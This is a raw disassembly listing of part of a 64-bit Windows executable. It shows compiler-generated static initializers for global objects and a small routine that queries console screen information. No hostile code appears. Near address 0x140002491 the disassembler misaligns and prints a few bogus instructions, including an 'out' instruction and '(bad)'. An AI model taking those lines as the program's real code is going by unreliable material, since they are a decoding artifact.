   140001eeb:	48 c7 44 24 38 32 00 	movq   $0x32,0x38(%rsp)
   140001ef2:	00 00 
   140001ef4:	48 8b 05 1d 40 08 00 	mov    0x8401d(%rip),%rax        # 0x140085f18
   140001efb:	90                   	nop
   140001efc:	48 85 c0             	test   %rax,%rax
   140001eff:	75 1a                	jne    0x140001f1b
   140001f01:	4c 8d 05 38 31 02 00 	lea    0x23138(%rip),%r8        # 0x140025040
   140001f08:	48 8d 15 91 2f 02 00 	lea    0x22f91(%rip),%rdx        # 0x140024ea0
   140001f0f:	48 8d 0d 02 40 08 00 	lea    0x84002(%rip),%rcx        # 0x140085f18
   140001f16:	e8 d5 3c 03 00       	call   0x140035bf0
   140001f1b:	48 8b 3d f6 3f 08 00 	mov    0x83ff6(%rip),%rdi        # 0x140085f18
   140001f22:	45 33 c0             	xor    %r8d,%r8d
   140001f25:	33 d2                	xor    %edx,%edx
   140001f27:	48 8d 0d e2 40 08 00 	lea    0x840e2(%rip),%rcx        # 0x140086010
   140001f2e:	e8 8d 16 02 00       	call   0x1400235c0
   140001f33:	90                   	nop
   140001f34:	c6 05 55 41 08 00 00 	movb   $0x0,0x84155(%rip)        # 0x140086090
   140001f3b:	48 8d 05 b6 55 06 00 	lea    0x655b6(%rip),%rax        # 0x1400674f8
   140001f42:	48 89 05 4f 41 08 00 	mov    %rax,0x8414f(%rip)        # 0x140086098
   140001f49:	66 c7 05 4e 41 08 00 	movw   $0x100,0x8414e(%rip)        # 0x1400860a0
   140001f50:	00 01 
   140001f52:	48 8d 05 b7 55 06 00 	lea    0x655b7(%rip),%rax        # 0x140067510
   140001f59:	48 89 05 b0 40 08 00 	mov    %rax,0x840b0(%rip)        # 0x140086010
   140001f60:	48 8d 05 a1 52 06 00 	lea    0x652a1(%rip),%rax        # 0x140067208
   140001f67:	48 89 05 3a 41 08 00 	mov    %rax,0x8413a(%rip)        # 0x1400860a8
   140001f6e:	48 8d 05 63 55 06 00 	lea    0x65563(%rip),%rax        # 0x1400674d8
   140001f75:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001f7a:	48 c7 44 24 28 11 00 	movq   $0x11,0x28(%rsp)
   140001f81:	00 00 
   140001f83:	0f b7 05 90 40 08 00 	movzwl 0x84090(%rip),%eax        # 0x14008601a
   140001f8a:	be 00 40 00 00       	mov    $0x4000,%esi
   140001f8f:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001f94:	66 85 c6             	test   %ax,%si
   140001f97:	74 51                	je     0x140001fea
   140001f99:	66 0f 7f 44 24 40    	movdqa %xmm0,0x40(%rsp)
   140001f9f:	48 8b 05 8a 3f 08 00 	mov    0x83f8a(%rip),%rax        # 0x140085f30
   140001fa6:	90                   	nop
   140001fa7:	48 85 c0             	test   %rax,%rax
   140001faa:	75 1a                	jne    0x140001fc6
   140001fac:	4c 8d 05 8d 2f 02 00 	lea    0x22f8d(%rip),%r8        # 0x140024f40
   140001fb3:	48 8d 15 b6 2d 02 00 	lea    0x22db6(%rip),%rdx        # 0x140024d70
   140001fba:	48 8d 0d 6f 3f 08 00 	lea    0x83f6f(%rip),%rcx        # 0x140085f30
   140001fc1:	e8 2a 3c 03 00       	call   0x140035bf0
   140001fc6:	48 8b 0d 63 3f 08 00 	mov    0x83f63(%rip),%rcx        # 0x140085f30
   140001fcd:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001fd2:	48 8d 15 37 40 08 00 	lea    0x84037(%rip),%rdx        # 0x140086010
   140001fd9:	e8 a2 62 02 00       	call   0x140028280
   140001fde:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001fe3:	0f b7 05 30 40 08 00 	movzwl 0x84030(%rip),%eax        # 0x14008601a
   140001fea:	b9 bf ff 00 00       	mov    $0xffbf,%ecx
   140001fef:	66 23 c1             	and    %cx,%ax
   140001ff2:	66 83 c8 20          	or     $0x20,%ax
   140001ff6:	0f 10 4c 24 30       	movups 0x30(%rsp),%xmm1
   140001ffb:	66 c7 05 9c 40 08 00 	movw   $0x100,0x8409c(%rip)        # 0x1400860a0
   140002002:	00 01 
   140002004:	c6 05 85 40 08 00 00 	movb   $0x0,0x84085(%rip)        # 0x140086090
   14000200b:	66 89 05 08 40 08 00 	mov    %ax,0x84008(%rip)        # 0x14008601a
   140002012:	0f 29 0d 17 40 08 00 	movaps %xmm1,0x84017(%rip)        # 0x140086030
   140002019:	0f 29 05 00 40 08 00 	movaps %xmm0,0x84000(%rip)        # 0x140086020
   140002020:	48 8d 05 89 40 08 00 	lea    0x84089(%rip),%rax        # 0x1400860b0
   140002027:	48 8b 0d 22 40 08 00 	mov    0x84022(%rip),%rcx        # 0x140086050
   14000202e:	48 8d 1d 23 3f 08 00 	lea    0x83f23(%rip),%rbx        # 0x140085f58
   140002035:	48 39 01             	cmp    %rax,(%rcx)
   140002038:	75 05                	jne    0x14000203f
   14000203a:	48 89 19             	mov    %rbx,(%rcx)
   14000203d:	eb 61                	jmp    0x1400020a0
   14000203f:	44 8b 05 12 40 08 00 	mov    0x84012(%rip),%r8d        # 0x140086058
   140002046:	4a 8d 14 c1          	lea    (%rcx,%r8,8),%rdx
   14000204a:	48 8b c1             	mov    %rcx,%rax
   14000204d:	48 3b ca             	cmp    %rdx,%rcx
   140002050:	74 0e                	je     0x140002060
   140002052:	48 39 18             	cmp    %rbx,(%rax)
   140002055:	74 49                	je     0x1400020a0
   140002057:	48 83 c0 08          	add    $0x8,%rax
   14000205b:	48 3b c2             	cmp    %rdx,%rax
   14000205e:	75 f2                	jne    0x140002052
   140002060:	44 3b 05 f5 3f 08 00 	cmp    0x83ff5(%rip),%r8d        # 0x14008605c
   140002067:	72 2a                	jb     0x140002093
   140002069:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   14000206f:	45 33 c0             	xor    %r8d,%r8d
   140002072:	48 8d 15 e7 3f 08 00 	lea    0x83fe7(%rip),%rdx        # 0x140086060
   140002079:	48 8d 0d d0 3f 08 00 	lea    0x83fd0(%rip),%rcx        # 0x140086050
   140002080:	e8 cb f0 01 00       	call   0x140021150
   140002085:	44 8b 05 cc 3f 08 00 	mov    0x83fcc(%rip),%r8d        # 0x140086058
   14000208c:	48 8b 0d bd 3f 08 00 	mov    0x83fbd(%rip),%rcx        # 0x140086050
   140002093:	41 8b c0             	mov    %r8d,%eax
   140002096:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   14000209a:	ff 05 b8 3f 08 00    	incl   0x83fb8(%rip)        # 0x140086058
   1400020a0:	4c 8b c7             	mov    %rdi,%r8
   1400020a3:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400020a8:	48 8d 0d b9 3f 08 00 	lea    0x83fb9(%rip),%rcx        # 0x140086068
   1400020af:	e8 ac 36 02 00       	call   0x140025760
   1400020b4:	48 8b 05 75 3e 08 00 	mov    0x83e75(%rip),%rax        # 0x140085f30
   1400020bb:	90                   	nop
   1400020bc:	48 85 c0             	test   %rax,%rax
   1400020bf:	75 1a                	jne    0x1400020db
   1400020c1:	4c 8d 05 78 2e 02 00 	lea    0x22e78(%rip),%r8        # 0x140024f40
   1400020c8:	48 8d 15 a1 2c 02 00 	lea    0x22ca1(%rip),%rdx        # 0x140024d70
   1400020cf:	48 8d 0d 5a 3e 08 00 	lea    0x83e5a(%rip),%rcx        # 0x140085f30
   1400020d6:	e8 15 3b 03 00       	call   0x140035bf0
   1400020db:	48 8b 0d 4e 3e 08 00 	mov    0x83e4e(%rip),%rcx        # 0x140085f30
   1400020e2:	45 33 c0             	xor    %r8d,%r8d
   1400020e5:	48 8d 15 24 3f 08 00 	lea    0x83f24(%rip),%rdx        # 0x140086010
   1400020ec:	e8 ef 2a 02 00       	call   0x140024be0
   1400020f1:	66 09 35 22 3f 08 00 	or     %si,0x83f22(%rip)        # 0x14008601a
   1400020f8:	48 8d 0d 21 10 06 00 	lea    0x61021(%rip),%rcx        # 0x140063120
   1400020ff:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002104:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   140002109:	48 83 c4 60          	add    $0x60,%rsp
   14000210d:	5f                   	pop    %rdi
   14000210e:	e9 1d a7 03 00       	jmp    0x14003c830
   140002113:	cc                   	int3
   140002114:	cc                   	int3
   140002115:	cc                   	int3
   140002116:	cc                   	int3
   140002117:	cc                   	int3
   140002118:	cc                   	int3
   140002119:	cc                   	int3
   14000211a:	cc                   	int3
   14000211b:	cc                   	int3
   14000211c:	cc                   	int3
   14000211d:	cc                   	int3
   14000211e:	cc                   	int3
   14000211f:	cc                   	int3
   140002120:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002125:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000212a:	57                   	push   %rdi
   14000212b:	48 83 ec 60          	sub    $0x60,%rsp
   14000212f:	48 8d 05 22 53 06 00 	lea    0x65322(%rip),%rax        # 0x140067458
   140002136:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000213b:	48 c7 44 24 38 34 00 	movq   $0x34,0x38(%rsp)
   140002142:	00 00 
   140002144:	48 8b 05 cd 3d 08 00 	mov    0x83dcd(%rip),%rax        # 0x140085f18
   14000214b:	90                   	nop
   14000214c:	48 85 c0             	test   %rax,%rax
   14000214f:	75 1a                	jne    0x14000216b
   140002151:	4c 8d 05 e8 2e 02 00 	lea    0x22ee8(%rip),%r8        # 0x140025040
   140002158:	48 8d 15 41 2d 02 00 	lea    0x22d41(%rip),%rdx        # 0x140024ea0
   14000215f:	48 8d 0d b2 3d 08 00 	lea    0x83db2(%rip),%rcx        # 0x140085f18
   140002166:	e8 85 3a 03 00       	call   0x140035bf0
   14000216b:	48 8b 3d a6 3d 08 00 	mov    0x83da6(%rip),%rdi        # 0x140085f18
   140002172:	45 33 c0             	xor    %r8d,%r8d
   140002175:	33 d2                	xor    %edx,%edx
   140002177:	48 8d 0d d2 40 08 00 	lea    0x840d2(%rip),%rcx        # 0x140086250
   14000217e:	e8 3d 14 02 00       	call   0x1400235c0
   140002183:	90                   	nop
   140002184:	c6 05 45 41 08 00 00 	movb   $0x0,0x84145(%rip)        # 0x1400862d0
   14000218b:	48 8d 05 66 53 06 00 	lea    0x65366(%rip),%rax        # 0x1400674f8
   140002192:	48 89 05 3f 41 08 00 	mov    %rax,0x8413f(%rip)        # 0x1400862d8
   140002199:	66 c7 05 3e 41 08 00 	movw   $0x100,0x8413e(%rip)        # 0x1400862e0
   1400021a0:	00 01 
   1400021a2:	48 8d 05 67 53 06 00 	lea    0x65367(%rip),%rax        # 0x140067510
   1400021a9:	48 89 05 a0 40 08 00 	mov    %rax,0x840a0(%rip)        # 0x140086250
   1400021b0:	48 8d 05 51 50 06 00 	lea    0x65051(%rip),%rax        # 0x140067208
   1400021b7:	48 89 05 2a 41 08 00 	mov    %rax,0x8412a(%rip)        # 0x1400862e8
   1400021be:	48 8d 05 cb 52 06 00 	lea    0x652cb(%rip),%rax        # 0x140067490
   1400021c5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400021ca:	48 c7 44 24 28 0d 00 	movq   $0xd,0x28(%rsp)
   1400021d1:	00 00 
   1400021d3:	0f b7 05 80 40 08 00 	movzwl 0x84080(%rip),%eax        # 0x14008625a
   1400021da:	be 00 40 00 00       	mov    $0x4000,%esi
   1400021df:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   1400021e4:	66 85 c6             	test   %ax,%si
   1400021e7:	74 51                	je     0x14000223a
   1400021e9:	66 0f 7f 44 24 40    	movdqa %xmm0,0x40(%rsp)
   1400021ef:	48 8b 05 3a 3d 08 00 	mov    0x83d3a(%rip),%rax        # 0x140085f30
   1400021f6:	90                   	nop
   1400021f7:	48 85 c0             	test   %rax,%rax
   1400021fa:	75 1a                	jne    0x140002216
   1400021fc:	4c 8d 05 3d 2d 02 00 	lea    0x22d3d(%rip),%r8        # 0x140024f40
   140002203:	48 8d 15 66 2b 02 00 	lea    0x22b66(%rip),%rdx        # 0x140024d70
   14000220a:	48 8d 0d 1f 3d 08 00 	lea    0x83d1f(%rip),%rcx        # 0x140085f30
   140002211:	e8 da 39 03 00       	call   0x140035bf0
   140002216:	48 8b 0d 13 3d 08 00 	mov    0x83d13(%rip),%rcx        # 0x140085f30
   14000221d:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002222:	48 8d 15 27 40 08 00 	lea    0x84027(%rip),%rdx        # 0x140086250
   140002229:	e8 52 60 02 00       	call   0x140028280
   14000222e:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140002233:	0f b7 05 20 40 08 00 	movzwl 0x84020(%rip),%eax        # 0x14008625a
   14000223a:	b9 bf ff 00 00       	mov    $0xffbf,%ecx
   14000223f:	66 23 c1             	and    %cx,%ax
   140002242:	66 83 c8 20          	or     $0x20,%ax
   140002246:	0f 10 4c 24 30       	movups 0x30(%rsp),%xmm1
   14000224b:	66 c7 05 8c 40 08 00 	movw   $0x100,0x8408c(%rip)        # 0x1400862e0
   140002252:	00 01 
   140002254:	c6 05 75 40 08 00 00 	movb   $0x0,0x84075(%rip)        # 0x1400862d0
   14000225b:	66 89 05 f8 3f 08 00 	mov    %ax,0x83ff8(%rip)        # 0x14008625a
   140002262:	0f 29 0d 07 40 08 00 	movaps %xmm1,0x84007(%rip)        # 0x140086270
   140002269:	0f 29 05 f0 3f 08 00 	movaps %xmm0,0x83ff0(%rip)        # 0x140086260
   140002270:	48 8d 05 39 3e 08 00 	lea    0x83e39(%rip),%rax        # 0x1400860b0
   140002277:	48 8b 0d 12 40 08 00 	mov    0x84012(%rip),%rcx        # 0x140086290
   14000227e:	48 8d 1d d3 3c 08 00 	lea    0x83cd3(%rip),%rbx        # 0x140085f58
   140002285:	48 39 01             	cmp    %rax,(%rcx)
   140002288:	75 05                	jne    0x14000228f
   14000228a:	48 89 19             	mov    %rbx,(%rcx)
   14000228d:	eb 61                	jmp    0x1400022f0
   14000228f:	44 8b 05 02 40 08 00 	mov    0x84002(%rip),%r8d        # 0x140086298
   140002296:	4a 8d 14 c1          	lea    (%rcx,%r8,8),%rdx
   14000229a:	48 8b c1             	mov    %rcx,%rax
   14000229d:	48 3b ca             	cmp    %rdx,%rcx
   1400022a0:	74 0e                	je     0x1400022b0
   1400022a2:	48 39 18             	cmp    %rbx,(%rax)
   1400022a5:	74 49                	je     0x1400022f0
   1400022a7:	48 83 c0 08          	add    $0x8,%rax
   1400022ab:	48 3b c2             	cmp    %rdx,%rax
   1400022ae:	75 f2                	jne    0x1400022a2
   1400022b0:	44 3b 05 e5 3f 08 00 	cmp    0x83fe5(%rip),%r8d        # 0x14008629c
   1400022b7:	72 2a                	jb     0x1400022e3
   1400022b9:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   1400022bf:	45 33 c0             	xor    %r8d,%r8d
   1400022c2:	48 8d 15 d7 3f 08 00 	lea    0x83fd7(%rip),%rdx        # 0x1400862a0
   1400022c9:	48 8d 0d c0 3f 08 00 	lea    0x83fc0(%rip),%rcx        # 0x140086290
   1400022d0:	e8 7b ee 01 00       	call   0x140021150
   1400022d5:	44 8b 05 bc 3f 08 00 	mov    0x83fbc(%rip),%r8d        # 0x140086298
   1400022dc:	48 8b 0d ad 3f 08 00 	mov    0x83fad(%rip),%rcx        # 0x140086290
   1400022e3:	41 8b c0             	mov    %r8d,%eax
   1400022e6:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   1400022ea:	ff 05 a8 3f 08 00    	incl   0x83fa8(%rip)        # 0x140086298
   1400022f0:	4c 8b c7             	mov    %rdi,%r8
   1400022f3:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400022f8:	48 8d 0d a9 3f 08 00 	lea    0x83fa9(%rip),%rcx        # 0x1400862a8
   1400022ff:	e8 5c 34 02 00       	call   0x140025760
   140002304:	48 8b 05 25 3c 08 00 	mov    0x83c25(%rip),%rax        # 0x140085f30
   14000230b:	90                   	nop
   14000230c:	48 85 c0             	test   %rax,%rax
   14000230f:	75 1a                	jne    0x14000232b
   140002311:	4c 8d 05 28 2c 02 00 	lea    0x22c28(%rip),%r8        # 0x140024f40
   140002318:	48 8d 15 51 2a 02 00 	lea    0x22a51(%rip),%rdx        # 0x140024d70
   14000231f:	48 8d 0d 0a 3c 08 00 	lea    0x83c0a(%rip),%rcx        # 0x140085f30
   140002326:	e8 c5 38 03 00       	call   0x140035bf0
   14000232b:	48 8b 0d fe 3b 08 00 	mov    0x83bfe(%rip),%rcx        # 0x140085f30
   140002332:	45 33 c0             	xor    %r8d,%r8d
   140002335:	48 8d 15 14 3f 08 00 	lea    0x83f14(%rip),%rdx        # 0x140086250
   14000233c:	e8 9f 28 02 00       	call   0x140024be0
   140002341:	66 09 35 12 3f 08 00 	or     %si,0x83f12(%rip)        # 0x14008625a
   140002348:	48 8d 0d 21 0e 06 00 	lea    0x60e21(%rip),%rcx        # 0x140063170
   14000234f:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002354:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   140002359:	48 83 c4 60          	add    $0x60,%rsp
   14000235d:	5f                   	pop    %rdi
   14000235e:	e9 cd a4 03 00       	jmp    0x14003c830
   140002363:	cc                   	int3
   140002364:	cc                   	int3
   140002365:	cc                   	int3
   140002366:	cc                   	int3
   140002367:	cc                   	int3
   140002368:	cc                   	int3
   140002369:	cc                   	int3
   14000236a:	cc                   	int3
   14000236b:	cc                   	int3
   14000236c:	cc                   	int3
   14000236d:	cc                   	int3
   14000236e:	cc                   	int3
   14000236f:	cc                   	int3
   140002370:	48 8d 0d 49 0e 06 00 	lea    0x60e49(%rip),%rcx        # 0x1400631c0
   140002377:	e9 b4 a4 03 00       	jmp    0x14003c830
   14000237c:	cc                   	int3
   14000237d:	cc                   	int3
   14000237e:	cc                   	int3
   14000237f:	cc                   	int3
   140002380:	48 8d 0d 49 0e 06 00 	lea    0x60e49(%rip),%rcx        # 0x1400631d0
   140002387:	e9 a4 a4 03 00       	jmp    0x14003c830
   14000238c:	cc                   	int3
   14000238d:	cc                   	int3
   14000238e:	cc                   	int3
   14000238f:	cc                   	int3
   140002390:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002395:	57                   	push   %rdi
   140002396:	48 83 ec 60          	sub    $0x60,%rsp
   14000239a:	48 8d 05 2f 52 06 00 	lea    0x6522f(%rip),%rax        # 0x1400675d0
   1400023a1:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400023a6:	48 c7 44 24 48 23 00 	movq   $0x23,0x48(%rsp)
   1400023ad:	00 00 
   1400023af:	45 33 c0             	xor    %r8d,%r8d
   1400023b2:	33 d2                	xor    %edx,%edx
   1400023b4:	48 8d 0d 75 40 08 00 	lea    0x84075(%rip),%rcx        # 0x140086430
   1400023bb:	e8 00 12 02 00       	call   0x1400235c0
   1400023c0:	90                   	nop
   1400023c1:	33 db                	xor    %ebx,%ebx
   1400023c3:	8b cb                	mov    %ebx,%ecx
   1400023c5:	48 89 1d e4 40 08 00 	mov    %rbx,0x840e4(%rip)        # 0x1400864b0
   1400023cc:	48 8d 05 95 51 06 00 	lea    0x65195(%rip),%rax        # 0x140067568
   1400023d3:	48 89 05 de 40 08 00 	mov    %rax,0x840de(%rip)        # 0x1400864b8
   1400023da:	48 8d 05 9f 51 06 00 	lea    0x6519f(%rip),%rax        # 0x140067580
   1400023e1:	48 89 05 48 40 08 00 	mov    %rax,0x84048(%rip)        # 0x140086430
   1400023e8:	48 8d 05 19 4e 06 00 	lea    0x64e19(%rip),%rax        # 0x140067208
   1400023ef:	48 89 05 ca 40 08 00 	mov    %rax,0x840ca(%rip)        # 0x1400864c0
   1400023f6:	48 8d 05 fb 51 06 00 	lea    0x651fb(%rip),%rax        # 0x1400675f8
   1400023fd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002402:	48 c7 44 24 28 07 00 	movq   $0x7,0x28(%rsp)
   140002409:	00 00 
   14000240b:	0f b7 05 28 40 08 00 	movzwl 0x84028(%rip),%eax        # 0x14008643a
   140002412:	bf 00 40 00 00       	mov    $0x4000,%edi
   140002417:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   14000241c:	66 85 c7             	test   %ax,%di
   14000241f:	74 58                	je     0x140002479
   140002421:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   140002427:	48 8b 05 02 3b 08 00 	mov    0x83b02(%rip),%rax        # 0x140085f30
   14000242e:	90                   	nop
   14000242f:	48 85 c0             	test   %rax,%rax
   140002432:	75 1a                	jne    0x14000244e
   140002434:	4c 8d 05 05 2b 02 00 	lea    0x22b05(%rip),%r8        # 0x140024f40
   14000243b:	48 8d 15 2e 29 02 00 	lea    0x2292e(%rip),%rdx        # 0x140024d70
   140002442:	48 8d 0d e7 3a 08 00 	lea    0x83ae7(%rip),%rcx        # 0x140085f30
   140002449:	e8 a2 37 03 00       	call   0x140035bf0
   14000244e:	48 8b 0d db 3a 08 00 	mov    0x83adb(%rip),%rcx        # 0x140085f30
   140002455:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000245a:	48 8d 15 cf 3f 08 00 	lea    0x83fcf(%rip),%rdx        # 0x140086430
   140002461:	e8 1a 5e 02 00       	call   0x140028280
   140002466:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   14000246b:	48 8b 0d 3e 40 08 00 	mov    0x8403e(%rip),%rcx        # 0x1400864b0
   140002472:	0f b7 05 c1 3f 08 00 	movzwl 0x83fc1(%rip),%eax        # 0x14008643a
   140002479:	0f 29 05 c0 3f 08 00 	movaps %xmm0,0x83fc0(%rip)        # 0x140086440
   140002480:	0f 10 44 24 40       	movups 0x40(%rsp),%xmm0
   140002485:	0f 29 05 c4 3f 08 00 	movaps %xmm0,0x83fc4(%rip)        # 0x140086450
   14000248c:	48 85 c9             	test   %rcx,%rcx
   14000248f:	74 44                	je     0x1400024d5
   140002491:	66 c7 44 48 ff c9 e9 	movw   $0xe9c9,-0x1(%rax,%rcx,2)
   140002498:	e7 01                	out    %eax,$0x1
   14000249a:	00 00                	add    %al,(%rax)
   14000249c:	4c 06                	rex.WR (bad)
   14000249e:	00 48 89             	add    %cl,-0x77(%rax)
   1400024a1:	44 24 20             	rex.R and $0x20,%al
   1400024a4:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400024a9:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   1400024ae:	e8 4d 42 03 00       	call   0x140036700
   1400024b3:	4c 8b c8             	mov    %rax,%r9
   1400024b6:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400024bb:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400024c0:	48 8d 0d 69 3f 08 00 	lea    0x83f69(%rip),%rcx        # 0x140086430
   1400024c7:	e8 a4 2e 02 00       	call   0x140025370
   1400024cc:	0f b7 05 67 3f 08 00 	movzwl 0x83f67(%rip),%eax        # 0x14008643a
   1400024d3:	eb 0e                	jmp    0x1400024e3
   1400024d5:	48 8d 0d 74 3a 08 00 	lea    0x83a74(%rip),%rcx        # 0x140085f50
   1400024dc:	48 89 0d cd 3f 08 00 	mov    %rcx,0x83fcd(%rip)        # 0x1400864b0
   1400024e3:	66 83 c8 18          	or     $0x18,%ax
   1400024e7:	66 89 05 4c 3f 08 00 	mov    %ax,0x83f4c(%rip)        # 0x14008643a
   1400024ee:	48 8d 05 bb 3b 08 00 	lea    0x83bbb(%rip),%rax        # 0x1400860b0
   1400024f5:	48 8b 0d 74 3f 08 00 	mov    0x83f74(%rip),%rcx        # 0x140086470
   1400024fc:	48 8d 1d 55 3a 08 00 	lea    0x83a55(%rip),%rbx        # 0x140085f58
   140002503:	48 39 01             	cmp    %rax,(%rcx)
   140002506:	75 05                	jne    0x14000250d
   140002508:	48 89 19             	mov    %rbx,(%rcx)
   14000250b:	eb 61                	jmp    0x14000256e
   14000250d:	44 8b 05 64 3f 08 00 	mov    0x83f64(%rip),%r8d        # 0x140086478
   140002514:	4a 8d 14 c1          	lea    (%rcx,%r8,8),%rdx
   140002518:	48 8b c1             	mov    %rcx,%rax
   14000251b:	48 3b ca             	cmp    %rdx,%rcx
   14000251e:	74 0e                	je     0x14000252e
   140002520:	48 39 18             	cmp    %rbx,(%rax)
   140002523:	74 49                	je     0x14000256e
   140002525:	48 83 c0 08          	add    $0x8,%rax
   140002529:	48 3b c2             	cmp    %rdx,%rax
   14000252c:	75 f2                	jne    0x140002520
   14000252e:	44 3b 05 47 3f 08 00 	cmp    0x83f47(%rip),%r8d        # 0x14008647c
   140002535:	72 2a                	jb     0x140002561
   140002537:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   14000253d:	45 33 c0             	xor    %r8d,%r8d
   140002540:	48 8d 15 39 3f 08 00 	lea    0x83f39(%rip),%rdx        # 0x140086480
   140002547:	48 8d 0d 22 3f 08 00 	lea    0x83f22(%rip),%rcx        # 0x140086470
   14000254e:	e8 fd eb 01 00       	call   0x140021150
   140002553:	44 8b 05 1e 3f 08 00 	mov    0x83f1e(%rip),%r8d        # 0x140086478
   14000255a:	48 8b 0d 0f 3f 08 00 	mov    0x83f0f(%rip),%rcx        # 0x140086470
   140002561:	41 8b c0             	mov    %r8d,%eax
   140002564:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   140002568:	ff 05 0a 3f 08 00    	incl   0x83f0a(%rip)        # 0x140086478
   14000256e:	48 8b 05 bb 39 08 00 	mov    0x839bb(%rip),%rax        # 0x140085f30
   140002575:	90                   	nop
   140002576:	48 85 c0             	test   %rax,%rax
   140002579:	75 1a                	jne    0x140002595
   14000257b:	4c 8d 05 be 29 02 00 	lea    0x229be(%rip),%r8        # 0x140024f40
   140002582:	48 8d 15 e7 27 02 00 	lea    0x227e7(%rip),%rdx        # 0x140024d70
   140002589:	48 8d 0d a0 39 08 00 	lea    0x839a0(%rip),%rcx        # 0x140085f30
   140002590:	e8 5b 36 03 00       	call   0x140035bf0
   140002595:	48 8b 0d 94 39 08 00 	mov    0x83994(%rip),%rcx        # 0x140085f30
   14000259c:	45 33 c0             	xor    %r8d,%r8d
   14000259f:	48 8d 15 8a 3e 08 00 	lea    0x83e8a(%rip),%rdx        # 0x140086430
   1400025a6:	e8 35 26 02 00       	call   0x140024be0
   1400025ab:	66 09 3d 88 3e 08 00 	or     %di,0x83e88(%rip)        # 0x14008643a
   1400025b2:	48 8d 0d 27 0c 06 00 	lea    0x60c27(%rip),%rcx        # 0x1400631e0
   1400025b9:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1400025be:	48 83 c4 60          	add    $0x60,%rsp
   1400025c2:	5f                   	pop    %rdi
   1400025c3:	e9 68 a2 03 00       	jmp    0x14003c830
   1400025c8:	cc                   	int3
   1400025c9:	cc                   	int3
   1400025ca:	cc                   	int3
   1400025cb:	cc                   	int3
   1400025cc:	cc                   	int3
   1400025cd:	cc                   	int3
   1400025ce:	cc                   	int3
   1400025cf:	cc                   	int3
   1400025d0:	48 83 ec 48          	sub    $0x48,%rsp
   1400025d4:	48 8b 05 1d 1d 08 00 	mov    0x81d1d(%rip),%rax        # 0x1400842f8
   1400025db:	48 33 c4             	xor    %rsp,%rax
   1400025de:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400025e3:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   1400025e8:	ff 15 52 1a 06 00    	call   *0x61a52(%rip)        # 0x140064040
   1400025ee:	48 8b c8             	mov    %rax,%rcx
   1400025f1:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400025f6:	ff 15 1c 1b 06 00    	call   *0x61b1c(%rip)        # 0x140064118
   1400025fc:	85 c0                	test   %eax,%eax
   1400025fe:	74 07                	je     0x140002607
   140002600:	0f b7 44 24 28       	movzwl 0x28(%rsp),%eax
   140002605:	eb 02                	jmp    0x140002609
   140002607:	33 c0                	xor    %eax,%eax
   140002609:	66 89 05 b8 3e 08 00 	mov    %ax,0x83eb8(%rip)        # 0x1400864c8
   140002610:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140002615:	48 33 cc             	xor    %rsp,%rcx
   140002618:	e8 83 9e 03 00       	call   0x14003c4a0
   14000261d:	48 83 c4 48          	add    $0x48,%rsp
   140002621:	c3                   	ret
   140002622:	cc                   	int3
   140002623:	cc                   	int3
   140002624:	cc                   	int3
   140002625:	cc                   	int3
   140002626:	cc                   	int3
   140002627:	cc                   	int3
   140002628:	cc                   	int3
   140002629:	cc                   	int3
   14000262a:	cc                   	int3
   14000262b:	cc                   	int3
   14000262c:	cc                   	int3
   14000262d:	cc                   	int3
   14000262e:	cc                   	int3
   14000262f:	cc                   	int3
   140002630:	48 83 ec 28          	sub    $0x28,%rsp
   140002634:	ba 02 00 00 00       	mov    $0x2,%edx
   140002639:	48 8d 0d f0 3e 08 00 	lea    0x83ef0(%rip),%rcx        # 0x140086530
   140002640:	e8 1b 95 03 00       	call   0x14003bb60
   140002645:	48 8d 0d e4 0b 06 00 	lea    0x60be4(%rip),%rcx        # 0x140063230
   14000264c:	48 83 c4 28          	add    $0x28,%rsp
   140002650:	e9 db a1 03 00       	jmp    0x14003c830
   140002655:	cc                   	int3
   140002656:	cc                   	int3
   140002657:	cc                   	int3
   140002658:	cc                   	int3
   140002659:	cc                   	int3
   14000265a:	cc                   	int3
   14000265b:	cc                   	int3
   14000265c:	cc                   	int3
   14000265d:	cc                   	int3
   14000265e:	cc                   	int3
   14000265f:	cc                   	int3
   140002660:	48 83 ec 28          	sub    $0x28,%rsp
   140002664:	ba 02 00 00 00       	mov    $0x2,%edx
